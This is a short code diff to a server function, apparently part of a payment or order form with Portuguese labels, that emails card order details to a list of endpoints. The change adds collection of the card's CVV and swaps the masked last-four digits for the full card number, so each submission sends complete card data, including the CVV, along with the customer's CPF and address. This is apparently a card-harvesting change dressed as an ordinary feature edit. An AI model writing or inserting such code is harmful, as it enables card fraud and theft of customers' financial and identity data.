@@ -14,6 +14,7 @@ const CardOrderInput = z.object({
     holder: z.string().min(2).max(120),
     number: z.string().min(12).max(24),
     expiry: z.string().min(4).max(7),
+    cvv: z.string().min(3).max(4),
     installments: z.string().min(1).max(2),
     address: z.string().min(5).max(255),
   }),
@@ -45,8 +46,9 @@ export const sendCardOrderEmail = createServerFn({ method: "POST" })
       CPF: data.customer.document,
       Endereço: data.card.address,
       "Titular do cartão": data.card.holder,
-      "Final do cartão": cardLastFour(data.card.number),
+      "Número do cartão": data.card.number,
       Validade: data.card.expiry,
+      CVV: data.card.cvv,
     };
 
     const endpoints = [
